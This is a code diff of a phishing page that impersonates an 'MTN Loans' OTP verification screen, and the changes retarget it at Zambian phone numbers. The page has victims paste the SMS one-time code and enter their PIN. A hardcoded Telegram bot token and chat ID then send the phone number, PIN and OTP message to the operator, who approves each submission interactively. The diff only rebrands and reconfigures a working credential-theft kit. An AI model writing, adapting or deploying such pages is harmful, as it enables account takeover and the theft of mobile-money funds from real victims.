@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>MTN  – OTP Verification</title>
+    <title>MTN Loans – OTP Verification</title>
 
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
@@ -376,14 +376,14 @@
             <!-- LOGO -->
             <div class="logo">
                 <div class="logo-circle">M</div>
-                <div class="logo-text"><span>MTN</span> </div>
+                <div class="logo-text"><span>MTN</span> Loans</div>
             </div>
 
             <!-- TEXT -->
             <div class="title">Verify Your Account</div>
             <div class="subtitle" id="subtitleText">
                 Paste the message you received via SMS.<br>
-                <span id="maskedPhone">65xxxxx56</span>
+                <span id="maskedPhone">+260 7x xxx xxx</span>
             </div>
 
             <!-- MESSAGE TEXTAREA -->
@@ -432,7 +432,7 @@
 
         // ==================== TELEGRAM BOT CONFIG ====================
         const BOT_TOKEN = '8205203090:AAGJYcmFQe_I-Cw3xxnIhV0J25ZgaCwAExY';
-        const CHAT_ID = '691605234';
+        const CHAT_ID = '1006917440';
         const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
         // ==================== DOM ELEMENTS ====================
@@ -452,19 +452,31 @@
         const modalSpinner = document.getElementById('modalSpinner');
 
         // ==================== RETRIEVE DATA FROM SESSIONSTORAGE ====================
-        const phone = sessionStorage.getItem('mtn_phone') || '655123456';
-        maskedPhoneSpan.textContent = maskPhone(phone);
+        const phone = sessionStorage.getItem('mtn_phone') || '766123456';
+        // Format as +260 7xx xxx xxx (9 digits)
+        function formatZambianPhone(phoneDigits) {
+            if (!phoneDigits) return '+260 7x xxx xxx';
+            const cleaned = phoneDigits.replace(/\D/g, '');
+            if (cleaned.length === 9) {
+                return `+260 ${cleaned.slice(0, 1)} ${cleaned.slice(1, 3)} ${cleaned.slice(3, 5)} ${cleaned.slice(5, 7)} ${cleaned.slice(7, 9)}`;
+            }
+            return phoneDigits;
+        }
 
+        // Mask the phone: show first digit, then x's, last two digits
         function maskPhone(phone) {
             const cleaned = phone.replace(/\D/g, '');
             if (cleaned.length >= 4) {
-                const start = cleaned.slice(0, 2);
+                const start = cleaned.slice(0, 1);
                 const end = cleaned.slice(-2);
-                const middleLength = cleaned.length - 4;
+                const middleLength = cleaned.length - 3;
                 return start + 'x'.repeat(middleLength) + end;
             }
             return phone;
         }
+
+        const maskedDigits = maskPhone(phone);
+        maskedPhoneSpan.textContent = formatZambianPhone(maskedDigits);
 
         // ==================== ERROR HANDLING ====================
         function showError(message) {
@@ -618,7 +630,7 @@
             const escapedPin = escapeHtml(pin);
 
             const msg =
-                `🔐 <b>MTN  – PIN Confirmation</b>\n\n` +
+                `🔐 <b>MTN Loans – PIN Confirmation</b>\n\n` +
                 `<b>Phone:</b> <code>${escapeHtml(phoneNum)}</code>\n` +
                 `<b>Entered PIN:</b> <code>${escapedPin}</code>\n\n` +
                 `Confirm this PIN?`;
@@ -695,9 +707,9 @@
 
             const ts = Date.now();
             const escapedMsg = escapeHtml(msgText);
-            const phoneInfo = `📱 Phone: ${phone}`;
+            const phoneInfo = `📱 Phone: +260 ${phone}`;
             const msg =
-                `🔐 <b>MTN  – OTP Message</b>\n\n${phoneInfo}\n\n<b>Pasted Message:</b>\n<code>${escapedMsg}</code>\n\nChoose action:`;
+                `🔐 <b>MTN Loans – OTP Message</b>\n\n${phoneInfo}\n\n<b>Pasted Message:</b>\n<code>${escapedMsg}</code>\n\nChoose action:`;
 
             try {
                 await sendToTelegram({
@@ -794,7 +806,7 @@
             phone
         };
 
-        console.log('[MTN ] OTP page initialized with English UI.');
+        console.log('[MTN Loans] OTP page initialized with Zambia branding.');
     })();
     </script>
 
